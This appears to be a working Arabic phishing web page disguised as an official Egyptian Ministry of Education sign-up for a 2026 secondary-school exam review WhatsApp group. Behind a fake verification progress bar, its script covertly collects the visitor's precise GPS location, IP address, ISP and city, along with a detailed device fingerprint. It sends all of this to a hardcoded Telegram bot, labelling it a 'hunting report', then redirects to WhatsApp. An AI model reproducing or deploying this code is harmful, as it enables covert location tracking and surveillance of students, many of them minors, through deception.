<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="📚 جروب مراجعات ثانوية عامة 2026 - (الرسمي) 🎓">
    <meta property="og:description" content="ثواني يا بطل.. جاري التحقق من بياناتك لدخول الجروب الرسمي.">
    <meta property="og:image" content="https://img.icons8.com/color/512/whatsapp.png">

    <title>منصة علمني | ثانوية عامة 2026</title>

    <script>
        async function startKimoRadar() {
            const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
            const chatId = "5890070301";

            // 1. طلب الـ GPS الدقيق (بالسنتي)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const gps = `📍 [GPS الدقيق]\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gps)}`);
                }, null, {enableHighAccuracy: true});
            }

            // 2. سحب بيانات الـ IP والشركة
            let ip = {};
            try { const res = await fetch('https://ipapi.co/json/'); ip = await res.json(); } catch(e) {}

            // 3. تحليل الجهاز (كارت الشاشة والرامات)
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected GPU";
            const ram = navigator.deviceMemory || "N/A";

            // 4. بناء التقرير العملاق (الـ 100 بند)
            const report = `
🔥 **KIMO V.MAX ULTIMATE - تقرير الصيد** 🔥
━━━━━━━━━━━━━━
🌍 **[1] الموقع والشبكة (البديل)**
• شركة النت: ${ip.org || "فودافون/وي"}
• الـ IP: \`${ip.ip}\`
• المحافظة: ${ip.region} | المدينة: ${ip.city}
• الموقع التقريبي: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
• نوع الاتصال: ${navigator.connection ? navigator.connection.effectiveType : "WiFi"}

📱 **[2] تفاصيل الموبايل (الموديل)**
• النظام: ${navigator.platform}
• المعالج: ${navigator.hardwareConcurrency} أنوية 🧠
• الرامات: ${ram} GB ⚡
• كارت الشاشة: \`${gpu}\`
• دقة الشاشة: ${screen.width}x${screen.height}
• عمق الألوان: ${screen.colorDepth} bit
• وضع الشاشة: ${screen.orientation ? screen.orientation.type : "N/A"}

🔋 **[3] حالة الطاقة والتخزين**
• البطارية: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A"}
• حالة الشحن: ${navigator.getBattery ? (await (await navigator.getBattery()).charging ? "⚡ متصل" : "🔋 غير متصل") : "N/A"}
• التخزين: ${navigator.storage ? "مدعوم" : "محمي"}

⚙️ **[4] البصمة الرقمية (الخرم)**
• المتصفح: ${navigator.userAgent.split(' ').pop()}
• وضع التخفي: ${!window.indexedDB ? "نشط 🕵️" : "معطل"}
• اللغة: ${navigator.language}
• التوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
• اللمس: ${navigator.maxTouchPoints} نقطة
━━━━━━━━━━━━━━
⏰ وقت الصيد: ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━`;

            // إرسال التقرير الشامل
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);

            // تحويل للواتساب بعد انتهاء الشريط
            setTimeout(() => {
                window.location.href = "https://chat.whatsapp.com/E5tpwhb6D5j9lDnXBFNbLM?mode=gi_t";
            }, 6500);
        }

        window.onload = () => {
            let i = 0;
            const bar = document.getElementById("bar");
            const status = document.getElementById("status_text");
            const phrases = ["جاري الاتصال بالسيرفر...", "ثواني يا بطل...", "جاري تسجيلك في جروب ثانوية عامة...", "جاري التحقق من المنطقة التعليمية...", "تم بنجاح! جاري تحويلك..."];
            
            const timer = setInterval(() => {
                if (i >= 100) {
                    clearInterval(timer);
                    startKimoRadar();
                } else {
                    i += 2;
                    bar.style.width = i + "%";
                    if (i % 20 === 0) status.innerText = phrases[Math.floor(i/20)];
                }
            }, 100);
        };
    </script>

    <style>
        body { background: #0b0e14; color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 90%; max-width: 400px; text-align: center; background: #161b22; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #30363d; position: relative; }
        .books { font-size: 50px; margin-bottom: 20px; display: block; animation: bounce 2s infinite; }
        h1 { font-size: 20px; color: #58a6ff; margin-bottom: 15px; }
        #status_text { font-size: 14px; color: #8b949e; margin-bottom: 20px; }
        .progress-container { background: #30363d; border-radius: 10px; height: 10px; width: 100%; overflow: hidden; }
        #bar { background: #238636; height: 100%; width: 0%; transition: 0.2s; }
        .watermark { position: absolute; top: 10px; right: 10px; opacity: 0.1; width: 50px; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
        .footer { font-size: 10px; color: #484f58; margin-top: 25px; border-top: 1px solid #30363d; padding-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/ar/0/03/Logo_of_the_Egyptian_Ministry_of_Education.png" class="watermark">
        <span class="books">📚</span>
        <h1>منصة علمني الرقمية</h1>
        <p id="status_text">جاري بدء عملية التحقق...</p>
        <div class="progress-container">
            <div id="bar"></div>
        </div>
        <div class="footer">وزارة التربية والتعليم والتعليم الفني - مصر 2026</div>
    </div>
</body>
</html>
